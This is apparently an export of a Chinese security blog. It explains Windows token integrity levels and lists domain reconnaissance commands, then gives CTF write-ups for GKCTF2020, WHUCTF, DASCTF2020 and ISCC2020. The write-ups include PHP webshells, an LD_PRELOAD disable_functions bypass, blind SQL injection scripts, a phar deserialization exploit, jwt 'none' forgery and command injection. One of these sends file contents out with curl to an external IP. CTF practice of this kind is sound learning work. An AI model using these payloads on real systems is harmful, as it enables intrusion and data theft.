Vista 开始，进程在创建的时候，可以得到一个访问令牌（Access Token），这个令牌有四个完整性级别： System（系统） High（高） Medium（中） Low（低） System 令牌是对系统完全操作的令牌，对应 SYSTEM 用户拥有的最高权限，可以对 Windows 操作系统做任何事。通常一个服务进程会以 SYSTEM 用户启动，拿到 System 令牌。 High 对应 Administrators 组拥有的最高权限，也就是前面所说的 Administrator 用户和用户自己创建的管理员账户的权限级别。此权限级别用来管理计算机，可以修改其他用户，可以修改系统的设置，这些设置可能会造成安全问题（比如更改系统时间可能导致杀毒软件失效）。 Medium 对应 Users 组拥有的最高权限，也就是前面所说的用户自己创建的标准用户。此权限级别用来日常使用。Medium 权限在 Windows Vista（实际上是其内核 NT6）中相比于之前版本的 Windows 有一些权限的提升，不危及系统安全性的操作在 Medium 下即可以完成，不需要切换到 High 级别。Users 组的用户是没有 High 和 System 令牌的，程序在此用户账户下，无论如何也无法拿到 High 和 System 令牌的，因为这个用户没有这样的令牌；如果要权限提升，需要输入管理员账号密码，而这时拿到的是这个管理员账号的 High 和 System 令牌。 Low 并不对应者一个用户组，这是为了一些需要特殊保护的应用程序准备的。有些应用容易受到攻击，那么使用 Low 令牌启动这些应用程序，可以最大程度减少利用这些应用对系统造成攻击。比如 IE 浏览器的页面进程使用 Low 令牌运行，其对系统很难做出什么改动，甚至也影响不了当前用户的文件；当需要需系统计算机进行交互的时候，会与 IE 的 UI 进程（Medium 令牌）进行通信，请求协助完成。 当 UAC 是开启状态，无论是管理员账户还是标准账户，Windows 资源管理器进程（explorer.exe）都是以 Medium 令牌启动进程。由于子进程通常能够继承父进程的令牌完整性级别，所以这样的设定可以防止用户双击打开的程序得到过高的令牌，从而在用户不知情的情况下危及系统安全。 ASRApplocker域和工作组工作组所有的计算机都是对等的，没有计算机可以控制另一台计算机。 每台计算机都具有一组用户帐户。若要登录到工作组中的任何计算机，您必须具有该计算机上的帐户。 通常情况下，计算机的数量不超过二十台。工作组不受密码保护。所有的计算机必须在同一本地网络或子网中。 域有一台或多台计算机为服务器。网络管理员使用服务器控制域中所有计算机的安全和权限。这使得更容易进行更改，因为更改会自动应用到所有的计算机。域用户在每次访问域时必须提供密码或其他凭据。 如果具有域上的用户帐户，您就可以登录到域中的任何计算机，而无需具有该计算机上的帐户。 由于网络管理员经常要确保计算机之间的一致性，所以，只能对计算机的设置进行有限制地更改。 一个域中可以有几千台计算机。计算机可以位于不同的本地网络中。 域是由域控制器(Domain Controller)和成员计算机组成，域控制器就是安装了活动 目录(Active Directory)的计算机。活动目录提供了存储网络上对象信息并使用网络使用该数据的方法。 内网常用命令12345678910111213141516171819#将Windows Server Core 加入到域netdom renamecomputer FileServer /newname:ProfileServer #更改计算机名称为ProfileServernetsh interface ipv4 set address name=&quot;本地连接&quot; source=static addr=192.168.10.212 mask= 255.255.255.0 gateway=192.168.10.1netsh interface ipv4 set dnsserver &quot;本地连接&quot; static 192.168.10.200 primarynetdom join %computername% /domain:http://ESS.COM /userd:administrator /passwordD:a1! /REBoot:5net user ------&gt; 本机用户列表net localhroup administrators ------&gt; 本机管理员[通常含有域用户]net user /domain ------&gt; 查询域用户net group /domain ------&gt; 查询域里面的工作组net group &quot;domain admins&quot; /domain ------&gt; 查询域管理员用户组net localgroup administrators /domain ------&gt; 登录本机的域管理员net localgroup administrators workgroup\\user001 /add -----&gt;域用户添加到本机net group &quot;Domain controllers&quot; -------&gt; 查看域控制器(如果有多台)ipconfig /all ------&gt; 查询本机IP段，所在域等net view ------&gt; 查询同一域内机器列表net view /domain ------&gt; 查询域列表net view /domain:domainname -----&gt; 查看workgroup域中计算机列表 参考： https://www.cnblogs.com/lip-blog/p/7658839.html https://blog.csdn.net/WPwalter/article/details/89838881 https://zhuanlan.zhihu.com/p/32287774 https://www.cnblogs.com/mq0036/p/3518542.html","categories":[],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"http://www.moonback.xyz/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}]},{"title":"GKCTF2020 writeup","slug":"GKCTF2020-writeup","date":"2020-05-24T02:36:26.000Z","updated":"2020-05-26T02:28:51.104Z","comments":true,"path":"2020/05/24/GKCTF2020-writeup/","link":"","permalink":"http://www.moonback.xyz/2020/05/24/GKCTF2020-writeup/","excerpt":"由防灾科技学院&amp;Bugfor举办的比赛，记一下！","text":"由防灾科技学院&amp;Bugfor举办的比赛，记一下！ webCheckINbase64加密一下，先往/tmp下写个马，然后包含这个马，蚁剑连上LD_PRELOAD bypass disable_function 12file_put_contents(&quot;/tmp/1.php&quot;, base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs=&quot;));include(&#x27;/tmp/moonback&#x27;); 贴一下php exp: 12345678910111213&lt;?php echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;; $cmd = $_GET[&quot;cmd&quot;]; $out_path = $_GET[&quot;outpath&quot;]; $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;; echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;; putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline); $so_path = $_GET[&quot;sopath&quot;]; putenv(&quot;LD_PRELOAD=&quot; . $so_path); mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;); echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; unlink($out_path);?&gt; 老八小超市儿默认密码，admin shopxo，后台上传主题getshell 蚁剑连上发现flag是假的，hint提示GET root,试了好多办法都不行 后来发现有auto.sh 12#!/bin/shwhile true; do (python /var/mail/makeflaghint.py &amp;) &amp;&amp; sleep 60; done 看了下进程是以root运行的，并且所有者是root makeflaghint.py: 12345678910import osimport ioimport timeos.system(&quot;whoami&quot;)gk1=str(time.ctime())gk=&quot;\\nGet The RooT,The Date Is Useful!&quot;f=io.open(&quot;/flag.hint&quot;, &quot;rb+&quot;)f.write(str(gk1))f.write(str(gk))f.close() 这个文件就很特殊了 所有用户对它都可写，因为上面auto.sh是以root运行的，并且里面调用了makeflaghint.py，相当于root运行makeflaghint.py，我们就可以改下内容，增加一行 1os.system(&#x27;cat /root/flag &gt; a&#x27;) 就能getflag了，真没想到！！！ cve版签到hint说cve-2020-7066，看一下介绍： 然后又在题目响应头里看到 然后构造flag就出来了，没搞懂23333 1?url&#x3D;http:&#x2F;&#x2F;127.0.0.123%00.ctfhub.com EZ三剑客-EzWeb查看源码，发现?secret，访问发现给出了靶机ip 直接用本机ip试发现 bp fuzz一下： 在173.167.10.11看到 提示要测试端口，试下 redis未授权访问，写shell，直接用Gopherus生成payload 注意要url二次编码 crypto小学生的密码学仿射密码，直接在线网站解： https://aliyunvi.com/affine 加密形式： 1e(x)&#x3D;ax+b (mod 26) 汉字的秘密当铺密码 原文： 12王壮 夫工 王中 王夫 由由井 井人 夫中 夫夫 井王 土土 夫由土夫 井中 士夫 王工 王人 土由 由口夫 替换后: 1269 74 62 67 118 83 72 77 86 55 7157 82 57 64 63 51 107 接着转ascii得到 12EJ&gt;CvSHMV7G9R9@?3k 应该想到的,tcl，E和F差1，J和L差2 12345678s=&#x27;EJ&gt;CvSHMV7G9R9@?3k&#x27;j=1flag=&#x27;&#x27;for i in s: flag=flag+chr(ord(i)+j) j=j+1print(flag)# flag&#123;you_are_good&#125; miscPokémon真就玩游戏就给flag，用VisualBoyAdvance打开玩就完事了 flag: 1flag&#123;PokEmon_14_CutE&#125; Harley Quinn压缩包描述里有提示,搜了下，发现是 FreeFileCamouflage一种隐写方式，可将文件隐写在JPG图片中 解压在Heathens.wav属性里看到hint 最后一段是拨号音，对照频谱 DTMF对照表 低频 \\ 高频(Hz) 1209 1336 1477 1633 697 1 2 3 A 770 4 5 6 B 852 7 8 9 C 941 * 0 # D 或者直接使用dtmf2num.exe 得出拨号音： 1#222833344477773338866# 三个2代表2的第三个字母即c，以此类推得到 1ctfisfun 然后解密就行 会得到flag.txt 1flag&#123;Pudd1n!!_y0u_F1nd_m3!&#125;","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"}]},{"title":"WHUCTF web wp","slug":"WHUCTF-web-wp","date":"2020-05-23T09:02:22.000Z","updated":"2020-06-02T08:18:18.450Z","comments":true,"path":"2020/05/23/WHUCTF-web-wp/","link":"","permalink":"http://www.moonback.xyz/2020/05/23/WHUCTF-web-wp/","excerpt":"武汉大学萌新赛的题目，做做吧！","text":"武汉大学萌新赛的题目，做做吧！ Easy_sqli有sql语句回显，很友好了，exp: 123456789101112131415161718192021222324252627282930313233343536373839import requestsurl=&quot;http://218.197.154.9:10011/login.php&quot;flag=&#x27;&#x27;proxies=&#123; &#x27;http&#x27;:&#x27;http://127.0.0.1:8080&#x27;&#125;# easy_sql1for i in range(1,50): f1=flag top=127 low=33 while low&lt;=top: mid=(top+low)//2 print(mid) data=&#123; &#x27;user&#x27;:&quot;admin&#x27; and if(ascii(substring((selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,sleep(3),0)#&quot;.format(str(i),str(mid)), &#x27;pass&#x27;:&#x27;admin&#x27; &#125; data1=&#123; &#x27;user&#x27;:&quot;admin&#x27; and if(ascii(substring((selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema=database()),&#123;&#125;,1))=&#123;&#125;,sleep(3),0)#&quot;.format(str(i),str(mid)), &#x27;pass&#x27;:&#x27;admin&#x27; &#125; try: r1=requests.post(url,data=data1,timeout=3,proxies=proxies) except requests.exceptions.ReadTimeout as e: flag=flag+chr(mid) print(chr(mid)) break else: try: r=requests.post(url,data=data,timeout=3,proxies=proxies) except requests.exceptions.ReadTimeout as e: low=mid+1 else: top=mid-1 if flag==f1: breakprint(flag) 爆数据库： 12345data=&#123; &#x27;user&#x27;:&quot;admin&#x27; and if(ascii(substring((database()),&#123;&#125;,1))=&#123;&#125;,sleep(3),0)#&quot;.format(str(i),str(mid)), &#x27;pass&#x27;:&#x27;admin&#x27; &#125;# easy_sql1 爆表： 12345data=&#123; &#x27;user&#x27;:&quot;admin&#x27; and if(ascii(substring((selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,sleep(3),0)#&quot;.format(str(i),str(mid)), &#x27;pass&#x27;:&#x27;admin&#x27; &#125;# f1ag_y0u_wi1l_n3ver_kn0w,users 爆字段： 12345data=&#123; &#x27;user&#x27;:&quot;admin&#x27; and if(ascii(substring((selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_schema=database() and table_name=&#x27;f1ag_y0u_wi1l_n3ver_kn0w&#x27; ),&#123;&#125;,1))&gt;&#123;&#125;,sleep(3),0)#&quot;.format(str(i),str(mid)), &#x27;pass&#x27;:&#x27;admin&#x27; &#125;# f111114g 爆内容： 12345data=&#123; &#x27;user&#x27;:&quot;admin&#x27; and if(ascii(substring((selselectect group_concat(f111114g) frfromom easy_sql1.f1ag_y0u_wi1l_n3ver_kn0w),&#123;&#125;,1))&gt;&#123;&#125;,sleep(3),0)#&quot;.format(str(i),str(mid)), &#x27;pass&#x27;:&#x27;admin&#x27; &#125;# WHUCTF&#123;r3lly_re11y_n0t_d1ffIcult_yet??~&#125; ezphp源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?phperror_reporting(0);highlight_file(__file__);$string_1 = $_GET[&#x27;str1&#x27;];$string_2 = $_GET[&#x27;str2&#x27;];//1stif($_GET[&#x27;num&#x27;] !== &#x27;23333&#x27; &amp;&amp; preg_match(&#x27;/^23333$/&#x27;, $_GET[&#x27;num&#x27;]))&#123; echo &#x27;1st ok&#x27;.&quot;&lt;br&gt;&quot;;&#125;else&#123; die(&#x27;会代码审计嘛23333&#x27;);&#125;//2ndif(is_numeric($string_1))&#123; $md5_1 = md5($string_1); $md5_2 = md5($string_2); if($md5_1 != $md5_2)&#123; $a = strtr($md5_1, &#x27;pggnb&#x27;, &#x27;12345&#x27;); $b = strtr($md5_2, &#x27;pggnb&#x27;, &#x27;12345&#x27;); if($a == $b)&#123; echo &#x27;2nd ok&#x27;.&quot;&lt;br&gt;&quot;; &#125; else&#123; die(&quot;can u give me the right str???&quot;); &#125; &#125; else&#123; die(&quot;no!!!!!!!!&quot;); &#125;&#125;else&#123; die(&#x27;is str1 numeric??????&#x27;);&#125;//3ndfunction filter($string)&#123; return preg_replace(&#x27;/x/&#x27;, &#x27;yy&#x27;, $string);&#125;$username = $_POST[&#x27;username&#x27;];$password = &quot;aaaaa&quot;;$user = array($username, $password);$r = filter(serialize($user));if(unserialize($r)[1] == &quot;123456&quot;)&#123; echo file_get_contents(&#x27;flag.php&#x27;);&#125; 第一层很好绕，直接%0a就行 第二层要求两个数md5不相等，经过strtr函数替换，该函数相当于生成一个替换字典，按照字典键值替换 123strtr($md5_1, &#x27;pggnb&#x27;, &#x27;12345&#x27;)// 相当于// p-&gt;1 g-&gt;3 n-&gt;4 b-&gt;5 这样就可以写一个脚本(不是我写的) 123456789101112131415&lt;?php$count = 0;for ($i = 1; $i &lt;= 100000000; $i++) &#123; $md5 = strtr(md5($i), &#x27;pggnb&#x27;, &#x27;12345&#x27;); if (preg_match(&#x27;/^0e\\d+$/&#x27;, $md5)) &#123; echo $i . &quot; &quot; . md5($i) . &quot;\\n&quot;; $count++; &#125; if ($count == 2) &#123; break; &#125;&#125;// 11230178 0e732639146814822596b49bb6939b97// 20493141 0e343359461627b56649445b748588b8// 替换后0e后面均为纯数字 最后一点相等利用php认为0e开头且后面是纯数字的都相等的特性 最后一关是反序列化字符逃逸，正常序列化的结果： 1a:2:&#123;i:0;s:4:&quot;test&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125; 确定要添加的内容,长度为20 1&quot;;i:1;s:6:&quot;123456&quot;;&#125; 列方程，n为x字符数量，y为其他字符 1n+y+20=2n+y 解得n=20，故构造 1username=xxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;123456&quot;;&#125; 查看源码得到flag ezcmd源码： 123456789101112131415161718192021222324252627282930313233&lt;?phpif(isset($_GET[&#x27;ip&#x27;]))&#123; $ip = $_GET[&#x27;ip&#x27;]; if(preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;1f&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match))&#123; echo preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;20&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match); die(&quot;fxck your symbol!&quot;); &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123; die(&quot;no space!&quot;); &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123; die(&quot;no flag&quot;); &#125; else if(preg_match(&quot;/tac|rm|echo|cat|nl|less|more|tail|head/&quot;, $ip))&#123; die(&quot;cat&#x27;t read flag&quot;); &#125; $a = shell_exec(&quot;ping -c 4 &quot;.$ip); echo &quot;&lt;pre&gt;&quot;; print_r($a);&#125;highlight_file(__FILE__);?&gt; 不知道为啥curl，echo都用不了，payload: 1?ip=||a=ca;b=t;$a$b$IFS`ls` ezinclude脑洞题，扫目录有：info.php,phpinfo 开了一大堆扩展，立马想到了phpinfo包含临时文件getshell 找了半天没没找到包含点，最后发现 就很奇怪，直接php://filter就能读flag，奇怪 Easy_unserialize我太菜了，抓包可以看到 html是这样写的： 1&lt;input type=&quot;submit&quot; name=&quot;acti0n&quot; placeholder=&quot;上传图片&quot; value=&quot;upload&quot; class=&#x27;btn&#x27; id=&#x27;b1&#x27;&gt; 自动进行302跳转 这里存在文件包含的,构造： 12?acti0n=php://filter/convert.bAse64-encode/resource=upload.php?acti0n=php://filter/string.rot13/resource=upload.php 读到源码upload.php： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?php error_reporting(0);$dir = &#x27;upload/&#x27;.md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]).&#x27;/&#x27;;if(!is_dir($dir)) &#123; if(!mkdir($dir, 0777, true)) &#123; echo error_get_last()[&#x27;message&#x27;]; die(&#x27;Failed to make the directory&#x27;); &#125;&#125;chdir($dir);if(isset($_POST[&#x27;submit&#x27;])) &#123; $name = $_FILES[&#x27;file&#x27;][&#x27;name&#x27;]; $tmp_name = $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]; $ans = exif_imagetype($tmp_name); if($_FILES[&#x27;file&#x27;][&#x27;size&#x27;] &gt;= 204800) &#123; die(&#x27;filesize too big.&#x27;); &#125; if(!$name) &#123; die(&#x27;filename can not be empty!&#x27;); &#125; if(preg_match(&#x27;/(htaccess)|(user)|(\\.\\.)|(%)|(#)/i&#x27;, $name) !== 0) &#123; die(&#x27;Hacker!&#x27;); &#125; if(($ans != IMAGETYPE_GIF) &amp;&amp; ($ans != IMAGETYPE_JPEG) &amp;&amp; ($ans != IMAGETYPE_PNG)) &#123; $type = $_FILES[&#x27;file&#x27;][&#x27;type&#x27;]; if($type == &#x27;image/gif&#x27; or $type == &#x27;image/jpg&#x27; or $type == &#x27;image/png&#x27; or $type == &#x27;image/jpeg&#x27;) &#123; echo &quot;&lt;p align=\\&quot;center\\&quot;&gt;Don&#x27;t cheat me with Content-Type!&lt;/p&gt;&quot;; &#125; echo(&quot;&lt;p align=\\&quot;center\\&quot;&gt;You can&#x27;t upload this kind of file!&lt;/p&gt;&quot;); exit; &#125; $content = file_get_contents($tmp_name); if(preg_match(&#x27;/(scandir)|(end)|(implode)|(eval)|(system)|(passthru)|(exec)|(chroot)|(chgrp)|(chown)|(shell_exec)|(proc_open)|(proc_get_status)|(ini_alter)|(ini_set)|(ini_restore)|(dl)|(pfsockopen)|(symlink)|(popen)|(putenv)|(syslog)|(readlink)|(stream_socket_server)|(error_log)/i&#x27;, $content) !== 0) &#123; echo(&#x27;&lt;script&gt;alert(&quot;You could not upload this image because of some dangerous code in your file!&quot;)&lt;/script&gt;&#x27;); exit; &#125; $extension = substr($name, strrpos($name, &quot;.&quot;) + 1); if(preg_match(&#x27;/(png)|(jpg)|(jpeg)|(phar)|(gif)|(txt)|(md)|(exe)/i&#x27;, $extension) === 0) &#123; die(&quot;&lt;p align=\\&quot;center\\&quot;&gt;You can&#x27;t upload this kind of file!&lt;/p&gt;&quot;); &#125; $upload_file = $name; move_uploaded_file($tmp_name, $upload_file); if(file_exists($name)) &#123; echo &quot;&lt;p align=\\&quot;center\\&quot;&gt;Your file $name has been uploaded.&lt;br&gt;&lt;/p&gt;&quot;; &#125; else &#123; echo &#x27;&lt;script&gt;alert(&quot;上传失败&quot;)&lt;/script&gt;&#x27;; &#125; echo &quot;&lt;p align=\\&quot;center\\&quot;&gt;&lt;a href=\\&quot;view.php\\&quot; &gt;点我去看上传的文件&lt;/a&gt;&lt;/p&gt;&quot;; #header(&quot;refresh:3;url=index.php&quot;);&#125; ?&gt; view.php: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;?php#include_once &quot;flag.php&quot;; error_reporting(0);class View&#123; public $dir; private $cmd; function __construct() &#123; $this-&gt;dir = &#x27;upload/&#x27;.md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]).&#x27;/&#x27;; $this-&gt;cmd = &#x27;echo &quot;&lt;div style=\\&quot;text-align: center;position: absolute;left: 0;bottom: 0;width: 100%;height: 30px;\\&quot;&gt;Powered by: xxx&lt;/div&gt;&quot;;&#x27;; if(!is_dir($this-&gt;dir)) &#123; mkdir($this-&gt;dir, 0777, true); &#125; &#125; function get_file_list() &#123; $file = scandir(&#x27;.&#x27;); return $file; &#125; function show_file_list() &#123; $file = $this-&gt;get_file_list(); for ($i = 2; $i &lt; sizeof($file); $i++) &#123; echo &quot;&lt;p align=\\&quot;center\\&quot; style=\\&quot;font-weight: bold;\\&quot;&gt;[&quot;.strval($i - 1).&quot;] $file[$i] &lt;/p&gt;&quot;; &#125; &#125; function show_img($file_name) &#123; $name = $file_name; $width = getimagesize($name)[0]; $height = getimagesize($name)[1]; $times = $width / 200; $width /= $times; $height /= $times; $template = &quot;&lt;img style=\\&quot;clear: both;display: block;margin: auto;\\&quot; src=\\&quot;$this-&gt;dir$name\\&quot; alt=\\&quot;$file_name\\&quot; width = \\&quot;$width\\&quot; height = \\&quot;$height\\&quot;&gt;&quot;; echo $template; &#125; function delete_img($file_name) &#123; $name = $file_name; if (file_exists($name)) &#123; @unlink($name); if(!file_exists($name)) &#123; echo &quot;&lt;p align=\\&quot;center\\&quot; style=\\&quot;font-weight: bold;\\&quot;&gt;成功删除! 3s后跳转&lt;/p&gt;&quot;; header(&quot;refresh:3;url=view.php&quot;); &#125; else &#123; echo &quot;Can not delete!&quot;; exit; &#125; &#125; else &#123; echo &quot;&lt;p align=\\&quot;center\\&quot; style=\\&quot;font-weight: bold;\\&quot;&gt;找不到这个文件! &lt;/p&gt;&quot;; &#125; &#125; function __destruct() &#123; eval($this-&gt;cmd); &#125;&#125;$ins = new View();chdir($ins-&gt;dir);echo &quot;&lt;h3&gt;当前目录为 &quot; . $ins-&gt;dir . &quot;&lt;/h3&gt;&quot;;$ins-&gt;show_file_list();if (isset($_POST[&#x27;show&#x27;])) &#123; $file_name = $_POST[&#x27;show&#x27;]; $ins-&gt;show_img($file_name);&#125;if (isset($_POST[&#x27;delete&#x27;])) &#123; $file_name = $_POST[&#x27;delete&#x27;]; $ins-&gt;delete_img($file_name);&#125;unset($ins);?&gt; 不用phar反序列化也能getflag，没过滤assert直接传个马包含 再看看phar反序列化怎末搞得吧，phar反序列化影响的函数： 在delete_img函数里我们看到了file_exists函数，由此，思路很明确，上传phar文件，然后删除文件就能触发反序列化了，构造exp: 123456789101112131415&lt;?phpclass View&#123; public $dir; private $cmd=&quot;echo &#x27;ok&#x27;;readfile(&#x27;/var/www/html/flag.php&#x27;);&quot;;&#125;$object = new View;$phar = new Phar(&quot;s.phar&quot;); //后缀名必须为 phar$phar-&gt;startBuffering();$phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;);$phar-&gt;setMetadata($object); //将自定义的 meta-data 存入 manifest$phar-&gt;addFromString(&quot;a.txt&quot;, &quot;a&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();?&gt; 然后上传phar文件，改下后缀为gif,需要用绝对路径，查看源码得到flag","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"}]},{"title":"DASCTF2020 wp","slug":"DASCTF2020-wp","date":"2020-05-22T00:16:07.000Z","updated":"2020-06-02T08:17:54.823Z","comments":true,"path":"2020/05/22/DASCTF2020-wp/","link":"","permalink":"http://www.moonback.xyz/2020/05/22/DASCTF2020-wp/","excerpt":"BJDCTF第三届和DASCTF联合举办的比赛！","text":"BJDCTF第三届和DASCTF联合举办的比赛！ web帮帮小红花这题刚开始有非预期，直接写文件就行 改过之后可以时间盲注爆flag，exp: 12345678910111213141516171819202122import requestsimport stringimport urllib.parseurl=&quot;http://183.129.189.60:10069/?imagin=&quot;payload1=&quot;sleep $(cat /flag|cut -c &#123;&#125;|tr &#123;&#125; 3)&quot;payload2=&quot;if test $(cat /flag|cut -c &#123;&#125;) = &#123;&#125;;then sleep 3;fi&quot;s=string.ascii_letters+string.digits+&#x27;&#123;@~^*_+&#125;&#x27;flag=&#x27;&#x27;for i in range(1,50): f=flag for j in s: try: u=url+urllib.parse.quote(payload1.format(str(i),j)) r=requests.get(u,timeout=3) except requests.exceptions.ReadTimeout as e: flag=flag+j print(j) break if f==flag: breakprint(flag) gob先测下功能，发现有登陆，但是用什么账号密码都能登陆，应该不是sql注入， 然后有上传文件的地方，上传什么都不会解析 还有个展示头像的地方，我们注意到 上传文件时我们可以目录穿越，可以上传到上级目录，但是还不会解析，既然上传的内容可以显示出来，我们直接构造到flag那让它读flag不就行了 虽然会提示文件存在，但不影响文件读取，直接解码base64加密的结果得到flag 老开发fuzz一下，发现下面可以注入 1username=admin&#x27; and 2=&#x27;2&amp;password=admin 猜测后台sql语句 1select * from users where username=&#x27;$username&#x27; and password=&#x27;$password&#x27; 此时注入的就是 1select * from users where username=&#x27;admin&#x27; and 2=&#x27;2&#x27; and password=&#x27;admin&#x27;","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"}]},{"title":"ISCC2020 writeup","slug":"ISCC2020-writeup","date":"2020-05-06T13:48:02.000Z","updated":"2020-06-02T08:14:56.981Z","comments":true,"path":"2020/05/06/ISCC2020-writeup/","link":"","permalink":"http://www.moonback.xyz/2020/05/06/ISCC2020-writeup/","excerpt":"记一下部分题目的writeup吧！","text":"记一下部分题目的writeup吧！ 练武题web阿森的爱情-1抓包发现Set-Cookie字段：添加并改成login=1 然后发现 解下MD5发现是573495，后来听说flag在readme.txt，不过被删了 Php is the best language下载文件给出源码： 1234567891011121314151617181920212223242526272829303132333435&lt;?php @error_reporting(1);include &#x27;flag.php&#x27;;class baby &#123; public $file; function __toString() &#123; if(isset($this-&gt;file)) &#123; $filename = &quot;./&#123;$this-&gt;file&#125;&quot;; if (base64_encode(file_get_contents($filename))) &#123; return base64_encode(file_get_contents($filename)); &#125; &#125; &#125;&#125;if (isset($_GET[&#x27;data&#x27;]))&#123; $data = $_GET[&#x27;data&#x27;]; $good = unserialize($data); echo $good;&#125;else &#123; $url=&#x27;./index.php&#x27;;&#125;$html=&#x27;&#x27;;if(isset($_POST[&#x27;test&#x27;]))&#123; $s = $_POST[&#x27;test&#x27;]; $html.=&quot;&lt;p&gt;è°¢è°¢å‚ä¸Ž!&lt;/p&gt;&quot;;&#125;?&gt; 扫目录发现flag.php,很简单的一道反序列化，exp: 1234567&lt;?phpclass baby &#123; public $file=&#x27;flag.php&#x27;;&#125;$a=new baby;echo serialize($a); payload: 1http://101.201.126.95:7003/?data=O:4:%22baby%22:1:&#123;s:4:%22file%22;s:8:%22flag.php%22;&#125; base64解码即可 What can images do文件上传题，发现图片示例那里可以包含，直接图片马 上传图片马 包含图片马 蚁剑连，在flag.php看到flag 未知的风险-1jwt题目，提示密码是flag{*}形式，但是这题不用破解，直接把加密算法修改成none就行，exp: 12import jwt print(jwt.encode(&#123;&quot;id&quot;:&quot;user&quot;,&quot;iat&quot;:1588775401,&quot;jti&quot;:&quot;b0b6f6e4fb94a81390aa7cca9ed7f773&quot;&#125;,algorithm=&quot;none&quot;,key=&quot;&quot;).decode(encoding=&#x27;utf-8&#x27;)) 成功替换发现是xxe，直接读flag.php Where is file?源码： 123456789&lt;?phpshow_source(__FILE__);echo $_GET[&#x27;hello&#x27;];$file=$_GET[&#x27;file&#x27;];while (strstr($file, &quot;file://&quot;)) &#123; $file=str_replace(&quot;file://&quot;, &quot;&quot;, $file);&#125;include($file);?&gt; 直接包含data://协议getshell 1?file=data://text/plain,&lt;?php eval($_POST[1]);?&gt; flag在flag.php里 1flag&#123;web_include_file&#125; 阿森的爱情-2sql注入，fuzz一下，发现过滤的并不多，但把经常用的()过滤了，并且过滤了password，order by判断有三列，且第二位为回显位 之前没做过过滤括号的题，搜了搜，发现可以用order by比较注入 先说一下order by，我们都知道order by 可以判断查询的列数，为啥呢？ 我们在查询的时候，order by 的作用是对某列进行排序，并且是以ASCII码的顺序来的 如果列数超过查询的列数自然会报错 那么如何进行order by比较注入呢？ 就这道题而言，我们可以猜测，password在第三列，并且只有一条数据，这样的话我们就可以按照 进行比较注入，exp: 12345678910111213141516171819202122import requestsimport strings=string.digits+string.ascii_lowercaseurl=&#x27;http://101.201.126.95:7006/&#x27;flag=&#x27;&#x27;for j in range(50): f=flag for i in s: data=&#123; &quot;username&quot;:&quot;admin&#x27; union select 1,1433223,&#x27;&#123;&#125;&#x27; order by 3#&quot;.format(flag+i), &quot;password&quot;:&quot;aaa&quot; &#125; r=requests.post(url,data=data) if &#x27;admin&#x27; in r.text: flag=flag+s[s.index(i)-1] print(s[s.index(i)-1]) break if flag==f: breakprint(flag)# bfe42ac26e273ef3a859a651e0a02df0 不知道为啥最后一个0跑了好几次才出来，一直凑不够32位,解MD5得到 1flag&#123;iloveishuai&#125; 阿帅的爱情访问得到源码： 1234567891011121314151617181920 &lt;?phpif(!isset($_GET[&quot;ip&quot;]))&#123; show_source(__file__);&#125; else&#123; $ip=$_GET[&quot;ip&quot;]; $pattern=&quot;/[;|&amp;].*[a-zA-Z]+/&quot;; if(preg_match($pattern,$ip)!=0)&#123; die(&#x27;bad domain&#x27;); &#125; try &#123; $result = shell_exec(&#x27;ping -c 4 &#x27; . $ip); &#125; catch(Exception $e) &#123; $result = $e-&gt;getMessage(); echo $result; &#125; $result = str_replace(&quot;\\n&quot;, &quot;&lt;br&gt;&quot;, $result); echo $result;&#125; 直接构造payload: 1?ip=`curl 47.97.210.141:9000/?$(tail -n 2 flag.php)` miscISCC签到直接改下高度就能看到 1ISCC&#123;D3tivtm_zv_Tq5I_Dygef&#125; 提交发现不对，猜测是某种编码，最终发现是凯撒密码变种,看下这个脚本吧，去掉数字和下划线，发现有规律 